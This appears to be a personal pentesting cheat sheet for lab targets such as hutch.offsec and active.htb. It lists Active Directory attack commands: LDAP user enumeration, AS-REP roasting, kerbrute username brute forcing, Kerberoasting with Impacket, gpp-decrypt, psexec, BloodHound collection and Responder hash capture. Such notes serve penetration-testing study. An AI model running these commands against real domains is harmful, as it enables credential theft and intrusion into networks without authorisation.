

### LDAP

**Lightweight Directory Access Protocol (LDAP) directories**. It allows you to search and retrieve information from an **Active Directory (AD) or LDAP server**, such as **users, groups, computers, and other directory objects**.

```sh
ldapsearch -x -H ldap://192.168.121.122 -b "DC=hutch,DC=offsec0" "(objectClass=*)" 


#ldap IP address we are searching for the informaion in the Active Directory (AD) domain name (group,user, policy , computer....)

#`objectClass` is an attribute that defines what kind of object it is (user, group, computer, organizationalUnit, etc.).


#usernames
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectclass=*)" | grep sAMAccountName:
```

if you know the username list
```shell
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

```shell
nxc ldap 10.10.11.35 -u '' -p '' --users 
```
### Kerbrute

after obtainng some samAccountName "username" we can use this account to check if pre-auth is off for any users if pre-auth is disable we may be able to **kerberoast** for domain credentials


```
 kerbrute -domain hutch.offsec -dc-ip 192.168.121.122 -user username

```

>brute force for username using kerbrute
```
kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  -t 100
```

### Impacket

```sh
#query Active Directory (AD) for user information from a domain controller

GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
```


```sh
# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords

GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```


>list users in domain
```
net user /domain

```


#### PowerView

[powershellmafia]

it’s a reconnaissance tool which you one can use after an initial foothold is gained.

The PowerView.ps1 script contains number of function which one can use to enumerate the Domain.



	
```sh
#GPP refers to a feature in Windows Group Policy that allowed administrators to deploy settings (like mapped drives, scheduled tasks, and local user passwords) across a domain

gpp-decrypt STRING
```

```shell 
#A powerful remote command execution tool by Microsoft 
psexec.py active.htb/svc_tgs@10.10.10.10
```


#### Bloodhound

>standard 

upload  sharphound into the target machine
```
./sharphound.exe --CollectionMethod All 

sharphound.exe -c all -d active.htb --domaincontroller 10.10.10.10
```

- then we will see bloodhound.zip file

Method to Download:
- Start a smb server on your kali


```
neo4j start
```

- upload the zip file inside the neo4j server 
- search for a specific user like svc_tgs or known username if not go to search pre-build queries  and  click on shortest path from kerberostable users 

>Dump Remotely from the kali connecting remotely to the machine
```
bloodhound-python -u [usename] -p [password] -ns $ip  -d [domain] -c all
```


```sh
# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords

GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```

>Tickets 

**Common Service Types:**

- **`cifs`** = File sharing (SMB)
- **`ldap`** = Active Directory access
- **`HTTP`** = Web services
- **`HOST`** = General host access
- **`DNS`** = DNS services
#### Responder 

LMNR for capturing hashes 
```
responder -I eth0 -rdwv 
```
